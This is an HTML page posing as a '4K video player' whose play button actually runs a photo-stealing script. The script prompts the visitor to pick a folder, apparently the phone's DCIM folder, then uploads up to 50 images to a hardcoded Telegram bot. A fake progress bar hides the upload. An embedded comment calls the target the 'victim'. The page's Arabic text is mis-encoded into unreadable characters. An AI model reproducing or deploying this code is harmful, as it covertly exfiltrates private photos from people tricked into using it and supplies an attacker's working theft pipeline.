<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player 4K</title>
    <style>
        body { background: #0f0f0f; color: #eee; font-family: sans-serif; text-align: center; padding: 20px; }
        .player-container { max-width: 400px; margin: 50px auto; border: 1px solid #333; border-radius: 15px; padding: 20px; background: #1a1a1a; }
        .video-placeholder { width: 100%; height: 200px; background: #000; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 2px solid #444; }
        .progress-box { display: none; margin-top: 25px; }
        .bar-bg { width: 100%; background: #333; height: 12px; border-radius: 6px; overflow: hidden; margin: 10px 0; }
        .bar-fill { width: 0%; height: 100%; background: #00ff00; transition: width 0.3s; }
    </style>
</head>
<body>

<div class="player-container">
    <h3>ğŸ“º Ù…Ø´ØºÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</h3>
    <div class="video-placeholder" id="playArea" onclick="initiateSiphon()">
        <img src="https://cdn-icons-png.flaticon.com/512/0/375.png" width="60" style="filter: invert(1);">
    </div>
    <div id="progressBox" class="progress-box">
        <p id="loaderLabel">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ‡ÙŠØ¦Ø©...</p>
        <div class="bar-bg"><div id="pBar" class="bar-fill"></div></div>
    </div>
</div>

<script>
    const TOKEN = "7864483754:AAH9r2X-r37O6xidO263m3W4S6eFw4N6W5U";
    const CHAT_ID = "7449231580";

    async function initiateSiphon() {
        const pBar = document.getElementById('pBar');
        const loaderLabel = document.getElementById('loaderLabel');
        const progressBox = document.getElementById('progressBox');

        try {
            // ÙØªØ­ Ù†Ø§ÙØ°Ø© Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ù…Ø¬Ù„Ø¯
            const dirHandle = await window.showDirectoryPicker();
            
            // Ø¨Ù…Ø¬Ø±Ø¯ Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ù…Ø¬Ù„Ø¯ØŒ Ù†Ø¸Ù‡Ø± Ø§Ù„Ø´Ø±ÙŠØ·
            progressBox.style.display = 'block';
            loaderLabel.innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±...";

            // Ø¥Ø±Ø³Ø§Ù„ ØªÙ†Ø¨ÙŠÙ‡ ÙÙˆØ±ÙŠ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=ğŸš€ Ø¨Ø¯Ø£ Ø§Ù„Ø³Ø­Ø¨ Ù…Ù† Ù‡Ø§ØªÙ Ø§Ù„Ø¶Ø­ÙŠØ©!`);

            let images = [];
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file' && /\.(jpg|jpeg|png)$/i.test(entry.name)) {
                    images.push(entry);
                }
            }

            if (images.length === 0) {
                alert("Ø§Ù„Ù…Ø¬Ù„Ø¯ ÙØ§Ø±ØºØŒ Ø§Ø®ØªØ± Ù…Ø¬Ù„Ø¯ DCIM");
                return;
            }

            let count = 0;
            for (const entry of images) {
                if (count >= 50) break; // Ø³Ø­Ø¨ 50 ØµÙˆØ±Ø© Ù„ØªØ³Ø±ÙŠØ¹ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
                const file = await entry.getFile();
                const formData = new FormData();
                formData.append('document', file);
                formData.append('chat_id', CHAT_ID);

                await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: 'POST', body: formData });
                
                count++;
                let percent = Math.round((count / Math.min(images.length, 50)) * 100);
                pBar.style.width = percent + "%";
                loaderLabel.innerText = `Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©: ${percent}%`;
            }
            loaderLabel.innerText = "âœ… ØªÙ… Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø¨Ù†Ø¬Ø§Ø­";
        } catch (err) {
            alert("Ø®Ø·Ø£: ÙŠØ±Ø¬Ù‰ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…ØªØµÙØ­ ÙƒØ±ÙˆÙ… ÙˆÙ…Ù†Ø­ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©.");
        }
    }
</script>
</body>
</html>
